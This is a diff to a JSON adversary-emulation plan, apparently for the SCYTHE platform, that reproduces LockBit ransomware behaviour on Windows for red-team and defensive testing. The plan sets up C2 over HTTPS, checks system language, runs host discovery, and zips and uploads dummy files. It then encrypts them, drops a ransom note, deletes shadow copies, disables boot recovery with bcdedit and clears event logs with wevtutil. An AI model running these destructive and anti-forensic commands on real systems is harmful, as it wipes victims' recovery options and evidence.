@@ -1,20 +1,20 @@
 {
     "threat": {
         "category": "User-Defined",
-        "description": "https://www.ic3.gov/Media/News/2022/220204.pdf",
-        "display_name": "LockBit",
-        "name": "LockBit",
+        "description": "Lockbit Ransomware emulation updated with description fields - https://www.ic3.gov/Media/News/2022/220204.pdf",
+        "display_name": "Lockbit - Updated Tags",
+        "name": "Lockbit - Updated Tags",
         "operating_system_name": "windows",
         "script": {
             "0": {
-                "conf": "--cp 127.0.0.1:443 --heartbeat 1 --multipart 10240 --secure true",
+                "conf": "{\"--cp\":\"scythe.theshepnet.com:443\",\"--secure\":true,\"--multipart\":10240}",
                 "module": "https",
                 "type": "initialization"
             },
             "1": {
-                "name": "THREAT",
+                "name": "Impact",
                 "type": "assign",
-                "value": "DESTRUCTIVE"
+                "value": "Caution! If executed in an elevated command prompt, this emulation is risky - It will remove Indicators and Inhibit Recovery in alignment with the threat behavior, however this will not leave the system in an unstable state."
             },
             "2": {
                 "module": "loader",
@@ -28,6 +28,11 @@
                 "type": "message"
             },
             "3": {
+                "name": "Description",
+                "type": "assign",
+                "value": "Check for language identifiers on Windows - Skip if matches Eastern European languages."
+            },
+            "4": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language",
@@ -36,15 +41,15 @@
                 ],
                 "type": "message"
             },
-            "4": {
+            "5": {
                 "function": "ifelse",
-                "next": "43",
-                "step": "3",
+                "next": "45",
+                "step": "4",
                 "type": "decision",
                 "value": "2092 1068 1067 1059 1079\n1087 1088 2073 1049 1064\n1090 2115 1091",
                 "verb": "contains"
             },
-            "5": {
+            "6": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "whoami",
@@ -57,7 +62,7 @@
                 ],
                 "type": "message"
             },
-            "6": {
+            "7": {
                 "module": "loader",
                 "module_to_load": "printscr",
                 "request": "--load printscr",
@@ -66,7 +71,7 @@
                 ],
                 "type": "message"
             },
-            "7": {
+            "8": {
                 "depends_on": "4346510a-3dad-4302-8572-2bcdc8bc2e2c",
                 "module": "printscr",
                 "request": "--window Desktop",
@@ -78,7 +83,7 @@
                 ],
                 "type": "message"
             },
-            "8": {
+            "9": {
                 "module": "loader",
                 "module_to_load": "sysinfo",
                 "request": "--load sysinfo",
@@ -87,7 +92,7 @@
                 ],
                 "type": "message"
             },
-            "9": {
+            "10": {
                 "depends_on": "14ba9c44-45b7-4630-b252-ad578faaeba9",
                 "module": "sysinfo",
                 "request": "",
@@ -99,7 +104,7 @@
                 ],
                 "type": "message"
             },
-            "10": {
+            "11": {
                 "module": "loader",
                 "module_to_load": "processes",
                 "request": "--load processes",
@@ -108,7 +113,7 @@
                 ],
                 "type": "message"
             },
-            "11": {
+            "12": {
                 "depends_on": "62dc619d-529a-441f-87e4-89778eee9587",
                 "module": "processes",
                 "request": "",
@@ -120,7 +125,7 @@
                 ],
                 "type": "message"
             },
-            "12": {
+            "13": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c dir %USERPROFILE%\\Documents",
@@ -132,7 +137,7 @@
                 ],
                 "type": "message"
             },
-            "13": {
+            "14": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "net use",
@@ -141,7 +146,7 @@
                 ],
                 "type": "message"
             },
-            "14": {
+            "15": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c mkdir \"%USERPROFILE%\\Desktop\\LockBit\"",
@@ -150,13 +155,13 @@
                 ],
                 "type": "message"
             },
-            "15": {
+            "16": {
                 "module": "loader",
                 "module_to_load": "file",
                 "request": "--load file",
                 "type": "message"
             },
-            "16": {
+            "17": {
                 "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
                 "module": "file",
                 "request": "--create --path \"%USERPROFILE%\\Desktop\\LockBit\\target_files.xls\" --size 5MB --count 10 --random",
@@ -165,13 +170,13 @@
                 ],
                 "type": "message"
             },
-            "17": {
+            "18": {
                 "module": "loader",
                 "module_to_load": "upsh",
                 "request": "--load upsh",
                 "type": "message"
             },
-            "18": {
+            "19": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
                 "request": "--cmd \"Compress-Archive -Path $env:userprofile\\Desktop\\LockBit -CompressionLevel Optimal -Destination $env:userprofile\\Desktop\\LockBit\\exfil.zip\"",
@@ -181,13 +186,13 @@
                 ],
                 "type": "message"
             },
-            "19": {
+            "20": {
                 "module": "loader",
                 "module_to_load": "uploader",
                 "request": "--load uploader",
                 "type": "message"
             },
-            "20": {
+            "21": {
                 "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
                 "module": "uploader",
                 "request": "--remotepath \"%USERPROFILE%\\Desktop\\LockBit\\exfil.zip\"",
@@ -197,12 +202,12 @@
                 ],
                 "type": "message"
             },
-            "21": {
+            "22": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "IMPACT"
             },
-            "22": {
+            "23": {
                 "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
                 "module": "file",
                 "request": "--create --path \"%USERPROFILE%\\Desktop\\LockBit_Ransomware.hta\" --size 1MB --random",
@@ -211,13 +216,13 @@
                 ],
                 "type": "message"
             },
-            "23": {
+            "24": {
                 "module": "loader",
                 "module_to_load": "crypt",
                 "request": "--load crypt",
                 "type": "message"
             },
-            "24": {
+            "25": {
                 "depends_on": "ff705b65-037a-4f06-b21e-e74e6cfe32bc",
                 "module": "crypt",
                 "request": "--target \"%USERPROFILE%\\Desktop\\LockBit\\\" --encrypt --password \"LockBit\" --erase --extension lockbit",
@@ -226,13 +231,13 @@
                 ],
                 "type": "message"
             },
-            "25": {
+            "26": {
                 "module": "loader",
                 "module_to_load": "downloader",
                 "request": "--load downloader",
                 "type": "message"
             },
-            "26": {
+            "27": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
                 "request": "--src \"VFS:/shared/threats/LockBit/Restore-My-Files.txt\" --dest \"%USERPROFILE%\\Desktop\\LockBit\\Restore-My-Files.txt\"",
@@ -241,7 +246,7 @@
                 ],
                 "type": "message"
             },
-            "27": {
+            "28": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell notepad \"%USERPROFILE%\\Desktop\\LockBit\\Restore-My-Files.txt\"",
@@ -250,12 +255,12 @@
                 ],
                 "type": "message"
             },
-            "28": {
+            "29": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "CLEANUP"
             },
-            "29": {
+            "30": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c rmdir /Q /S \"\"%USERPROFILE%\\Desktop\\LockBit\"\"",
@@ -264,7 +269,7 @@
                 ],
                 "type": "message"
             },
-            "30": {
+            "31": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /c del \"%USERPROFILE%\\Desktop\\LockBit_Ransomware.hta\"",
@@ -273,31 +278,36 @@
                 ],
                 "type": "message"
             },
-            "31": {
+            "32": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "DEFENSE EVASION"
             },
-            "32": {
+            "33": {
                 "name": "NO CLEANUP",
                 "type": "assign",
                 "value": "AT YOUR OWN RISK"
             },
-            "33": {
+            "34": {
                 "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
                 "module": "controller",
                 "request": "--integrity",
                 "type": "message"
             },
-            "34": {
+            "35": {
                 "function": "ifelse",
-                "next": "43",
-                "step": "33",
+                "next": "45",
+                "step": "34",
                 "type": "decision",
                 "value": "High",
                 "verb": "does not contain"
             },
-            "35": {
+            "36": {
+                "name": "IMPACT",
+                "type": "assign",
+                "value": "These steps will delete Volume Shadow Copies to inhibit recovery and clear the Windows Event logs for Indicator Removal. There is no cleanup or rollback for these actions!"
+            },
+            "37": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "vssadmin Delete Shadows /All /Quiet",
@@ -306,7 +316,7 @@
                 ],
                 "type": "message"
             },
-            "36": {
+            "38": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "bcdedit /set {default} recoveryenabled No",
@@ -315,7 +325,7 @@
                 ],
                 "type": "message"
             },
-            "37": {
+            "39": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
@@ -324,14 +334,14 @@
                 ],
                 "type": "message"
             },
-            "38": {
+            "40": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "wmic SHADOWCOPY /nointeractive",
                 "rtags": [],
                 "type": "message"
             },
-            "39": {
+            "41": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "wevtutil cl security",
@@ -340,7 +350,7 @@
                 ],
                 "type": "message"
             },
-            "40": {
+            "42": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "wevtutil cl system",
@@ -349,7 +359,7 @@
                 ],
                 "type": "message"
             },
-            "41": {
+            "43": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "wevtutil cl application",
@@ -358,7 +368,7 @@
                 ],
                 "type": "message"
             },
-            "42": {
+            "44": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no",
@@ -367,7 +377,7 @@
                 ],
                 "type": "message"
             },
-            "43": {
+            "45": {
                 "module": "controller",
                 "request": "--shutdown",
                 "rtags": [
